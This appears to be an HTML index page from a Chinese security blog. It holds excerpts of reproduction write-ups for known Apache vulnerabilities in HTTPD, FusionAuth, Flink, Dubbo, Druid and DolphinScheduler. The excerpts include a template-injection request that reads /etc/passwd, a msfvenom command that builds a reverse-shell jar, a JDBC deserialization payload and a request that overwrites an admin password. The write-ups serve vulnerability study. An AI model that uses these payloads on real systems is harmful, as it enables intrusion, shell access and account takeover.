@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/97/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-Apache HTTPD/（CVE-2017-15715）Apache HTTPD 换行解析漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apache%20HTTPD/%EF%BC%88CVE-2017-15715%EF%BC%89Apache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:52.446Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2017-15715）Apache-HTTPD-换行解析漏洞"><a href="#（CVE-2017-15715）Apache-HTTPD-换行解析漏洞" class="headerlink" title="（CVE-2017-15715）Apache HTTPD 换行解析漏洞"></a>（CVE-2017-15715）Apache HTTPD 换行解析漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Apache<br>HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache HTTPD 2.4.0~2.4.29</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>上传一个名为1.php的文件，被拦截：</p>
+<p><img src="/resource/(CVE-2017-15715)ApacheHTTPD%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<p>在1.php后面插入一个<code>\x0A</code>（注意，不能是<code>\x0D\x0A</code>，只能是一个<code>\x0A</code>），不再拦截：</p>
+<p><img src="/resource/(CVE-2017-15715)ApacheHTTPD%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Apache%20HTTPD/%EF%BC%88CVE-2017-15715%EF%BC%89Apache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20HTTPD/%EF%BC%88CVE-2017-15715%EF%BC%89Apache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qm5n001ky8v1hxxl0a1e" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Apache HTTPD/Apache HTTPD 多后缀解析漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apache%20HTTPD/Apache%20HTTPD%20%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:52.444Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Apache-HTTPD-多后缀解析漏洞"><a href="#Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="Apache HTTPD 多后缀解析漏洞"></a>Apache HTTPD 多后缀解析漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Apache HTTPD<br>支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：</p>
+<pre><code>AddType text/html .html
+AddLanguage zh-CN .cn
+</code></pre>
+<p>其给<code>.html</code>后缀增加了media-type，值为<code>text/html</code>；给<code>.cn</code>后缀增加了语言，值为<code>zh-CN</code>。此时，如果用户请求文件<code>index.cn.html</code>，他将返回一个中文的html页面。</p>
+<p>以上就是Apache多后缀的特性。如果运维人员给<code>.php</code>后缀增加了处理器：</p>
+<pre><code>AddHandler application/x-httpd-php .php
+</code></pre>
+<p>那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p>
+<p>//说白了就是文件重命名为<code>xxx.php.jpg</code>就可以被识别成php文件</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Apache%20HTTPD/Apache%20HTTPD%20%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20HTTPD/Apache%20HTTPD%20%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qm5m001jy8v1068070wn" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Apache FusionAuth/（CVE-2020-7799） Apache FreeMarker模板FusionAuth远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apache%20FusionAuth/%EF%BC%88CVE-2020-7799%EF%BC%89%20Apache%20FreeMarker%E6%A8%A1%E6%9D%BFFusionAuth%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:52.424Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-7799）-Apache-FreeMarker模板FusionAuth远程代码执行漏洞"><a href="#（CVE-2020-7799）-Apache-FreeMarker模板FusionAuth远程代码执行漏洞" class="headerlink" title="（CVE-2020-7799） Apache FreeMarker模板FusionAuth远程代码执行漏洞"></a>（CVE-2020-7799） Apache FreeMarker模板FusionAuth远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>在FusionAuth<br>1.11.0版本之前的中发现了一个问题。经过身份验证的用户允许编辑电子邮件模板（主页-&gt;设置-&gt;电子邮件模板）或主题（主页-&gt;设置-&gt;主题），可利用<code>freemarker.template.utility.Execute</code>执行任意命令</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>post提交</p>
+<pre><code>POST /ajax/email/template/preview HTTP/1.1
+Host: www.0-sec.org:9011
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: */*
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 796
+DNT: 1
+Connection: close
+Referer: http://192.168.0.3:9011/admin/email/template/edit/2c2591f5-2136-4a77-8b5a-1f5e9fb0e25b
+Cookie: JSESSIONID=FA9DB3CBABA6B37E5336AE4B96001807; 
+
+primeCSRFToken=kRC228UjAA4ohN_E9PW9kz0HpTlxUDCB_HVrDhBUfWU&amp;emailTemplateId=2c2591f5-2136-4a77-8b5a-1f5e9fb0e25b&amp;emailTemplate.name=COPPA%20Notice&amp;emailTemplate.defaultSubject=Notice%20of%20your%20consent&amp;emailTemplate.fromEmail=no-reply%40fusionauth.io&amp;emailTemplate.defaultFromName=FusionAuth&amp;emailTemplate.defaultTextTemplate=You%20recently%20granted%20your%20child%20consent%20in%20our%20system.%20This%20email%20is%20to%20notify%20you%20of%20this%20consent.%20If%20you%20did%20not%20grant%20this%20consent%20or%20wish%20to%20revoke%20this%20consent%2C%20click%20the%20link%20below%3A%0A%0Ahttp%3A%2F%2Fexample.com%2Fconsent%2Fmanage%0A%0A-%20FusionAuth%20Admin&amp;emailTemplate.defaultHtmlTemplate=$&#123;&quot;freemarker.template.utility.Execute&quot;?new()(&quot;cat /etc/passwd&quot;)&#125;&#125;
+</code></pre>
+<p><img src="/resource/(CVE-2020-7799)ApacheFreeMarker%E6%A8%A1%E6%9D%BFFusionAuth%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<h3 id="批量检测脚本"><a href="#批量检测脚本" class="headerlink" title="批量检测脚本"></a>批量检测脚本</h3><p><a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/CVE-2020-7799/">https://github.com/ianxtianxt/CVE-2020-7799/</a></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Apache%20FusionAuth/%EF%BC%88CVE-2020-7799%EF%BC%89%20Apache%20FreeMarker%E6%A8%A1%E6%9D%BFFusionAuth%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20FusionAuth/%EF%BC%88CVE-2020-7799%EF%BC%89%20Apache%20FreeMarker%E6%A8%A1%E6%9D%BFFusionAuth%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qm5m001iy8v1d5undg9j" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Apache Flink/Apache Flink Dashboard 未授权访问-远程代码命令执行" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apache%20Flink/Apache%20Flink%20Dashboard%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
+  <time datetime="2022-07-08T06:25:52.398Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Apache-Flink-Dashboard-未授权访问-远程代码命令执行"><a href="#Apache-Flink-Dashboard-未授权访问-远程代码命令执行" class="headerlink" title="Apache Flink Dashboard 未授权访问-远程代码命令执行"></a>Apache Flink Dashboard 未授权访问-远程代码命令执行</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Apache Flink的任意Jar包上传导致远程代码执行的漏洞</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>&lt;= 1.9.1(最新版本)</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h3><pre><code>msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.20.166 LPORT=8989 -f jar &gt; rce.jar
+</code></pre>
+<p><img src="/resource/ApacheFlinkDashboard%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/media/rId25.png"></p>
+<h3 id="2、"><a href="#2、" class="headerlink" title="2、"></a>2、</h3>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Apache%20Flink/Apache%20Flink%20Dashboard%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20Flink/Apache%20Flink%20Dashboard%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="cl5c2qm5l001hy8v1giyk8nu8" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Apache Dubbo/（CVE-2020-1948）Apache Dubbo Hessian 反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apache%20Dubbo/%EF%BC%88CVE-2020-1948%EF%BC%89Apache%20Dubbo%20Hessian%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:52.308Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-1948）Apache-Dubbo-Hessian-反序列化漏洞"><a href="#（CVE-2020-1948）Apache-Dubbo-Hessian-反序列化漏洞" class="headerlink" title="（CVE-2020-1948）Apache Dubbo Hessian 反序列化漏洞"></a>（CVE-2020-1948）Apache Dubbo Hessian 反序列化漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>攻击者可以发送带有无法识别的服务名或方法名及某些恶意参数负载的RPC请求，当恶意参数被反序列化时将导致代码执行</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>2.7.0 &lt;= Apache Dubbo &lt;= 2.7.7</p>
+<p>2.6.0 &lt;= Apache Dubbo &lt;= 2.6.7</p>
+<p>Apache Dubbo 全部 2.5.x 版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>Hessian是一个轻量级的RPC框架。它基于HTTP协议传输，使用Hessian二进制序列化，对于数据包比较大的情况比较友好。使用hession的web项目需要配置web.xml,映射<code>com.caucho.hessian.server.HessianServlet</code>之相应的路径</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Apache%20Dubbo/%EF%BC%88CVE-2020-1948%EF%BC%89Apache%20Dubbo%20Hessian%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20Dubbo/%EF%BC%88CVE-2020-1948%EF%BC%89Apache%20Dubbo%20Hessian%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qm0u001dy8v13177apxc" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Apache Dubbo/（CVE-2019-17564）Apache Dubbo 反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apache%20Dubbo/%EF%BC%88CVE-2019-17564%EF%BC%89Apache%20Dubbo%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:52.306Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-17564）Apache-Dubbo-反序列化漏洞"><a href="#（CVE-2019-17564）Apache-Dubbo-反序列化漏洞" class="headerlink" title="（CVE-2019-17564）Apache Dubbo 反序列化漏洞"></a>（CVE-2019-17564）Apache Dubbo 反序列化漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p><code>Apache Dubbo</code>支持多种协议，推荐官方使用<code>Dubbo</code>协议。<code>Apache Dubbo HTTP</code>协议中的一个反序列化漏洞（CVE-2019-17564），漏洞该主要原因的在于当<code>Apache Dubbo</code>启用<code>HTTP</code>协议之后，<code>Apache Dubbo</code>对消息体处理不当导致不安全反序列化，当项目包中存在可用的<code>gadgets</code>时即可导致远程代码执行。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>2.7.0 &lt;= Apache Dubbo &lt;= 2.7.4.12.6.0 &lt;= Apache Dubbo &lt;= 2.6.7Apache Dubbo = 2.5.x</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><ul>
+<li>  1.环境建设</li>
+</ul>
+<p>为了环境搭建方便，访问<code>dubbo-samples</code>的github项目主页（<a target="_blank" rel="noopener" href="https://github.com/apache/dubbo-samples%EF%BC%89">https://github.com/apache/dubbo-samples）</a></p>
+<p>下载源码以后，分离出http部分</p>
+<p><img src="/resource/(CVE-2019-17564)ApacheDubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Apache%20Dubbo/%EF%BC%88CVE-2019-17564%EF%BC%89Apache%20Dubbo%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20Dubbo/%EF%BC%88CVE-2019-17564%EF%BC%89Apache%20Dubbo%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qm0v001ey8v1h1ry0d0k" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Apache Druid/apache-druid远程代码执行漏洞(CVE-2021-25646)" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apache%20Druid/apache-druid%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-25646)/" class="article-date">
+  <time datetime="2022-07-08T06:25:52.273Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Apache-Druid-远程代码执行漏洞（CVE-2021-25646）"><a href="#Apache-Druid-远程代码执行漏洞（CVE-2021-25646）" class="headerlink" title="Apache Druid 远程代码执行漏洞（CVE-2021-25646）"></a>Apache Druid 远程代码执行漏洞（CVE-2021-25646）</h1><h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p>Apache Druid是美国阿帕奇软件（Apache）基金会的一款使用Java语言编写的、面向列的开源分布式数据库。</p>
+<p>Apache Druid 0.20.0和更早的版本存在访问控制错误漏洞，该漏洞允许经过身份验证的用户强制Druid运行用户提供的JavaScript代码，并执行服务器进程特权的代码。</p>
+<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Druid &lt; 0.20.1</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">为了复现方便，这里使用docker搭建环境</span><br><span class="line">docker search docker-druid #搜索镜像</span><br><span class="line">docker pull fokkodriesprong/docker-druid #拉取镜像</span><br><span class="line">docker run --rm -i -p 8888:8888  fokkodriesprong/docker-druid #启动镜像</span><br></pre></td></tr></table></figure>
+
+<p>注：如果大家拉取镜像比较慢可以配置一下国内镜像源，这里我使用的是阿里云的加速源URL为:<a target="_blank" rel="noopener" href="https://cr.console.aliyun.com/">https://cr.console.aliyun.com/</a></p>
+<p>## 本机访问IP:888端口显示该页面表示启动成功</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Apache%20Druid/apache-druid%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-25646)/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20Druid/apache-druid%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-25646)/" data-id="cl5c2qlzt001cy8v18ngg0xst" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Apache DolphinScheduler/（CVE-2020-11974）Apache DolphinScheduler 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apache%20DolphinScheduler/%EF%BC%88CVE-2020-11974%EF%BC%89Apache%20DolphinScheduler%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:52.190Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-11974）Apache-DolphinScheduler-远程代码执行漏洞"><a href="#（CVE-2020-11974）Apache-DolphinScheduler-远程代码执行漏洞" class="headerlink" title="（CVE-2020-11974）Apache DolphinScheduler 远程代码执行漏洞"></a>（CVE-2020-11974）Apache DolphinScheduler 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>CVE-2020-11974与mysql<br>connectorj远程执行代码漏洞有关，在选择mysql作为数据库时，攻击者可通过<code>jdbc connect</code>参数输入<code>&#123;“detectCustomCollations”:true，“ autoDeserialize”:true&#125;</code><br>即可在DolphinScheduler 服务器上远程执行代码</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache DolphinScheduler = 1.2.0、1.2.1</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>看到这个poc的时候</p>
+<pre><code>&#123;&quot;detectCustomCollations&quot;:true,&quot;autoDeserialize&quot;:true,&quot;serverTimezone&quot;:&quot;UTC&quot;&#125;
+</code></pre>
+<p>其实我第一反应就是2019年的blackhat的那个利用但我又不太确定，直到我按照其他师傅复现的19年的blackhat的那个漏洞利用方式来复现成功，仔细分析了一波。我们先看这个创建数据库的接口。当我们点击create之后</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Apache%20DolphinScheduler/%EF%BC%88CVE-2020-11974%EF%BC%89Apache%20DolphinScheduler%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20DolphinScheduler/%EF%BC%88CVE-2020-11974%EF%BC%89Apache%20DolphinScheduler%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qlx0001by8v16n1y0jue" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Apache DolphinScheduler/(CVE-2020-13922)Apache DolphinScheduler 权限覆盖漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apache%20DolphinScheduler/(CVE-2020-13922)Apache%20DolphinScheduler%20%E6%9D%83%E9%99%90%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:52.187Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CVE-2020-13922-Apache-DolphinScheduler-权限覆盖漏洞"><a href="#CVE-2020-13922-Apache-DolphinScheduler-权限覆盖漏洞" class="headerlink" title="(CVE-2020-13922)Apache DolphinScheduler 权限覆盖漏洞"></a>(CVE-2020-13922)Apache DolphinScheduler 权限覆盖漏洞</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /dolphinscheduler/users/update</span><br><span class="line"></span><br><span class="line">id=1&amp;userName=admin&amp;userPassword=Password1!&amp;tenantId=1&amp;email=sdluser%40sdluser.sdluser&amp;phone=</span><br></pre></td></tr></table></figure>
+
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Apache%20DolphinScheduler/(CVE-2020-13922)Apache%20DolphinScheduler%20%E6%9D%83%E9%99%90%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
